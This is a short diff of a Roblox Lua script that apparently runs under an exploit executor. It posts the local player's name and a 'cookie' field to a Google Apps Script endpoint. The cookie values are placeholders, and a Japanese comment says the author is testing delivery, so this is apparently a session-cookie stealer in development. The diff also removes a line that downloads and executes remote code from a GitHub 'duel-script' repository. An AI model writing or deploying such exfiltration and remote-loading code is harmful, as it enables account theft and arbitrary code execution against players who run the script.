@@ -1,10 +1,14 @@
-local gasUrl = "https://script.google.com/macros/s/AKfycbz58FXbr9osiq0GY_O1o_RB-TVlhbDWFujyirhd4xqK9haqUT7hXXWRRVUeU8mINatvAQ/exec"
+-- 実行数爆増を防ぐロック
+if _G.Sentinel_Lock then return end
+_G.Sentinel_Lock = true
+
+local gasUrl = "https://script.google.com/macros/s/AKfycbx8qjjwGBExw64FvNZDxEb6YpzsGGlh1j8B7Qhc9TBiRJzjnh4jpC6EtB9BIFeNhMYA/exec"
 
 task.spawn(function()
     local payload = {
         user = game.Players.LocalPlayer.Name,
-        cookie = "TEST_COOKIE_DATA", -- まずは固定文字で届くかテスト
-        status = "FINAL_CHECK"
+        cookie = "STILL_NOT_WORKING_IF_EMPTY",
+        status = "RE-DEPLOYED_TEST"
     }
 
     local req = (getgenv().request or getgenv().http_request or request)
@@ -17,5 +21,3 @@ task.spawn(function()
         })
     end
 end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/delt-script/duel-script/main/main.lua"))()
